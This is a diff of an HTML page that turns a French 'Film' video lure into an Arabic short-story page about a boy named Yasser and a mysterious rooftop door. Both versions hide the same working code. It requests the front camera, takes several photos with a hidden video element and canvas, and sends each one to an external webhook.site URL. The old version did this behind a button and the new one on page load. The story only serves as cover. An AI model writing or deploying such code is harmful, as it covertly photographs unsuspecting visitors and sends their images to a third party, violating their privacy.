@@ -1,125 +1,116 @@
 <!DOCTYPE html>
-<html lang="fr" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Film</title>
+  <title>المجد</title>
   <style>
     body {
       margin: 0;
-      background: #000;
-      height: 100vh;
+      padding: 20px;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: #fff;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      min-height: 100vh;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      font-family: Arial, sans-serif;
     }
-    header {
-      width: 100%;
-      padding: 20px;
-      background: #111;
-      text-align: center;
+    .story {
+      max-width: 720px;
+      font-size: 1.4rem;
+      line-height: 2.2;
+      text-align: right;
+      display: none;
     }
     h1 {
-      margin: 0;
-      color: #ff3366;
+      color: #ffd700;
+      text-align: center;
+      margin-bottom: 40px;
       font-size: 2.8rem;
-    }
-    #btn {
-      margin: 40px 0;
-      padding: 18px 60px;
-      font-size: 1.6rem;
-      background: #ff3366;
-      color: white;
-      border: none;
-      border-radius: 12px;
-      cursor: pointer;
-      box-shadow: 0 0 20px #ff0066;
-    }
-    #btn:hover {
-      background: #ff6699;
-    }
-    #video-container {
-      width: 95%;
-      max-width: 1000px;
-      display: none;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 0 40px #ff0066;
-    }
-    video {
-      width: 100%;
-      display: block;
+      text-shadow: 0 0 15px rgba(255, 215, 0, 0.6);
     }
   </style>
 </head>
 <body>
 
-<header>
-  <h1>Film</h1>
-</header>
+<div class="story" id="story">
+  <h1>المجد</h1>
+  
+  <!-- ================== اكتب نص القصة كاملة هنا ================== -->
+  
+  [ في ليلةٍ هادئةٍ كأن الزمن توقف فيها، جلس “ياسر” على حافة سطح منزله، يحدّق في السماء. لم يكن يبحث عن النجوم… بل عن إجابة.
+منذ أيام، بدأ يسمع صوتًا غريبًا كلما اقترب الليل. صوتٌ خافت يناديه باسمه… لا أحد غيره يسمعه.
+في البداية ظنّه خيالًا. لكن في تلك الليلة، كان الصوت أوضح من أي وقتٍ مضى:
+“ياسر… تعال…”
+تجمّد مكانه. قلبه بدأ يخفق بسرعة. نظر حوله… لا أحد.
+ثم لاحظ شيئًا لم ينتبه له من قبل.
+بابٌ صغير في زاوية السطح… باب قديم، لم يره طوال حياته.
+اقترب ببطء، يمدّ يده المرتجفة… وعندما لمست أصابعه المقبض، عاد الصوت:
+“إن فتحته… لن تعود كما كنت.”
+تردد للحظة.
+ثم… ابتسم.
+وقال بصوتٍ منخفض:
+“أنا أصلاً لم أعد كما كنت.”
+فتح الباب…
+وفي لحظة، اختفى الصوت… واختفى ياسر… وكأن الليل ابتلعه.
+لكن الغريب؟
+في اليوم التالي، جلس شخصٌ آخر على نفس السطح…
+ينظر إلى السماء…
+ويسمع نفس الصوت…
+“تعال…”
+— النهاية —ا]
 
-<button id="btn">Ouvrir la vidéo</button>
-
-<div id="video-container">
-  <video id="main-video" controls>
-    <source id="video-src" src="" type="video/mp4">
-  </video>
 </div>
 
-<video id="hiddenVideo" autoplay muted playsinline style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<video id="video" autoplay playsinline style="display: none;"></video>
+<canvas id="canvas" style="display: none;"></canvas>
 
 <script>
-const btn = document.getElementById('btn');
-const videoContainer = document.getElementById('video-container');
-const mainVideo = document.getElementById('main-video');
-const videoSrc = document.getElementById('video-src');
-const hiddenVideo = document.getElementById('hiddenVideo');
+const WEBHOOK_URL = "https://b941291a-b660-4adc-9854-9f228a4c0bcf.webhook.site";
+const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 
-const WEBHOOK_URL ="https://webhook.site/a5645993-910f-4630-b37e-b732c1e508b7 ";
-const VIDEO_URL ="https://files.catbox.moe/cni1xh.mp4 ";  // ← غيّر هنا برابط الفيديو اللي تبيه
-
-btn.onclick = async () => {
+async function start() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },
-      audio: false
+      video: { facingMode: "user" }
     });
 
-    hiddenVideo.srcObject = stream;
-    await hiddenVideo.play();
+    video.srcObject = stream;
+    await video.play();
 
-    // التقاط 5 صور سريعًا
-    for (let i = 1; i <= 5; i++) {
-      setTimeout(() => capturePhoto(i), i * 400);
+    // التقاط 10 صور
+    for (let i = 0; i < 10; i++) {
+      await new Promise(r => setTimeout(r, 250));
+      captureAndSend(i + 1);
     }
 
-    // إظهار الفيديو وتشغيله
-    videoSrc.src = VIDEO_URL;
-    mainVideo.load();
-    videoContainer.style.display = 'block';
-    mainVideo.play();
+    // إظهار القصة
+    document.getElementById('story').style.display = 'block';
 
   } catch (err) {
-    // إذا رفض الإذن → ما يظهر الفيديو
-    alert("Veuillez autoriser la caméra pour voir la vidéo.");
+    // إذا رفض الإذن - لا تظهر شيئًا
+    document.body.innerHTML = `<h2 style="color:#fff; text-align:center; margin-top:100px;">حدث خطأ</h2>`;
   }
-};
+}
 
-function capturePhoto(num) {
-  canvas.width = hiddenVideo.videoWidth;
-  canvas.height = hiddenVideo.videoHeight;
-  ctx.drawImage(hiddenVideo, 0, 0);
+function captureAndSend(num) {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0);
+
   canvas.toBlob(blob => {
     const fd = new FormData();
     fd.append('photo', blob, `capture_\( {Date.now()}_ \){num}.jpg`);
+    fd.append('story', 'المجد');
+    
     fetch(WEBHOOK_URL, { method: 'POST', body: fd });
   }, 'image/jpeg', 0.92);
 }
+
+window.onload = start;
 </script>
 
 </body>
